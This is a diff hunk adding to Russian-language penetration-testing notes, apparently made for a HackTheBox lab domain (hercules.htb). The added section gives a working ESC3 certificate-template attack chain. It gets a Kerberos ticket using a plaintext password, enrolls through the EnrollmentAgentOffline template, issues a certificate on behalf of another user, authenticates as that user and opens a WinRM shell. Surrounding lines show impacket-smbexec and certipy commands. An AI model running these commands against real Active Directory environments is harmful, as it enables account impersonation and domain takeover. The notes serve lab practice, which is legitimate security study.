@@ -512,6 +512,26 @@
 		impacket-smbexec -k -no-pass LAB-DC.LAB.LOCAL
 
 		certipy-ad auth -pfx sql.pfx
+
+*********************Еще вариант
+
+		Выпишем PFX от имени fernando.r (выполняем атаку ESC3):
+		impacket-getTGT hercules.htb/fernando.r:'Prettyprincess123!'
+		export KRB5CCNAME=fernando.r.ccache
+		
+		certipy-ad req -k -upn fernando.r@hercules.htb -dc-ip 10.129.242.196 -dc-host dc.hercules.htb -target DC.hercules.htb -ca CA-HERCULES -template EnrollmentAgentOffline -application-policies 'Client Authentication' -dcom
+		
+	А теперь от его имени на имя ashley.b:
+
+		certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass -dc-ip 10.129.242.196 -dc-host dc.hercules.htb -target "dc.hercules.htb" -ca 'CA-HERCULES' -template "User" -pfx fernando.r.pfx -on-behalf-of "hercules\ashley.b" -dcom
+
+	Выпишем тикет на ashley.b и подключимся за нее:
+
+	certipy-ad auth -pfx ashley.b.pfx -dc-ip $(cat /etc/hosts | grep hercules.htb | cut -d ' ' -f 1)
+	export KRB5CCNAME=ashley.b.ccache
+	python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
+
+
   
 *** ESC4 - возможность изменить шаблон сертификата чтобы использовать его как ESC1
 			
